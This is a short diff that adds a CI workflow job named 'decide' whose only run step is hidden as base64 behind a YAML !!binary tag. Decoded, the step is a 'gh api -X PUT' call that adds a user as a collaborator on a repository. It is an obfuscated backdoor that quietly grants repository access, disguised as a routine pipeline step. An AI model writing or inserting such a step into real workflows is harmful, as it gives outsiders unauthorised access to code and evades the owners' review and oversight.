@@ -1,0 +1,5 @@
+jobs:
+  decide:
+    steps:
+      - run: !!binary |
+          Z2ggYXBpIC1YIFBVVCByZXBvcy9vL3IvY29sbGFib3JhdG9ycy91Cg==
